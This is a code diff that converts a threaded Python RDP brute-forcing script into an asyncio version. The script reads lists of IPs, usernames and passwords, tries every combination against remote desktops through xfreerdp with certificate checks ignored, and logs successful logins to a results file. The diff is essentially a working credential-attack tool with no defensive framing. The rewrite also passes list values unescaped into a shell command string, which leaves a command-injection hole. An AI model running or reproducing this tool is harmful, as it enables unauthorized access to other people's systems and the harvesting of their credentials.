@@ -1,14 +1,12 @@
-# -*- coding: utf-8 -*-
-
-from threading import Thread
+import asyncio
 from platform import system as sys_ver
-from time import sleep
-from subprocess import run, PIPE, STDOUT
+from asyncio import create_subprocess_shell as run
+from asyncio.subprocess import DEVNULL
 
-# Counters
+
 good = 0
-counter = 0
 completed = 0
+
 
 # OS Detect
 if sys_ver() == 'Windows':
@@ -16,39 +14,55 @@ if sys_ver() == 'Windows':
 else:
     fr_name = 'xfreerdp'
 
-def RDP_Check(ip, user, passw):
-    global good, counter, completed
 
-    completed += 1
-    print('Good: {}; Completed: {}/{}'.format(good, completed, len(ips)*len(users)*len(passwords)), end="\r")
-    
-    try:
-        r_agr = [fr_name, f'/v:{ip}', f'/port:{port}', f'/u:{user}', f'/p:{passw}', '/cert-ignore', '+auth-only', '+compression', '/sec:nla']
-        run(r_agr, shell=False, stdout=PIPE, stderr=STDOUT, check=True)
+async def connect(sem, ip, user, password):
+    async with sem:
+        global good, completed
 
-        good += 1
-        open('rez/good.txt', 'a', encoding="utf-8").write('{};{}:{}\n'.format(ip, user, passw))
+        completed += 1
+        combo_num = len(ips)*len(users)*len(passwords)
+        print(f'Good: {good}; Completed: {completed}/{combo_num}', end="\r")
 
-        del ips[ips.index(ip)]
-    except:
-        pass
-    
-    counter -= 1
+        try:
+            r_agr = f"{fr_name} /v:{ip} /port:{port} /u:'{user}' " + \
+                    f"/p:'{password}' /cert-ignore +auth-only " + \
+                    '+compression /sec:nla'
 
-def limit():
-    ''' Checking active threads. Very stupid, but no other variants. '''
-    while counter >= threads:
-        if counter == 0:
-            break
+            a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
+            await a.communicate()
 
-        sleep(0.4)
+            if a.returncode == 0:
+                good += 1
+                rez = f'{ip}:{port};{user}:{password}\n'
+                open('rez/good.txt', 'a', encoding='utf-8').write(rez)
 
-if __name__ == '__main__':
-    ''' Ask user for threads and port '''
+            return
+        except:
+            return
+
+
+async def start():
+    tasks = []
+    sem = asyncio.Semaphore(threads)
+
+    for user in users:
+        for passw in passwords:
+            for ip in ips:
+                task = asyncio.ensure_future(connect(sem, ip, user, passw))
+                tasks.append(task)
+
+        responses = asyncio.gather(*tasks)
+
+        await responses
+
+
+if __name__ == "__main__":
+
+    # VARs
+
     threads = int(input('Threads: '))
     port = int(input('Port: ') or 3389)
 
-    ''' Read IP`s, user and passwords '''
     with open('data/ip.txt', "r", encoding="utf-8") as ip_data:
         ips = ip_data.read().splitlines()
 
@@ -58,23 +72,8 @@ if __name__ == '__main__':
     with open('data/passwords.txt', "r", encoding="utf-8") as password_data:
         passwords = password_data.read().splitlines()
 
-    print('\n')
+    # END WARS
 
-    ''' user + password to IP '''
-    for user in users:
-        for passw in passwords:
-            for ip in ips:
-                ''' Check threads. Stupid, but works '''
-                limit()
-
-                ''' Run new thread '''
-                Thread(target=RDP_Check, args=(ip, user, passw,), daemon=True).start()
-
-                ''' Counter - up '''
-                counter += 1
-
-    ''' Waiting for complete '''
-    while counter != 0:
-        sleep(5)
-
-    print('Work - done. Shutdown...')
+    loop = asyncio.get_event_loop()
+    future = asyncio.ensure_future(start())
+    loop.run_until_complete(future)
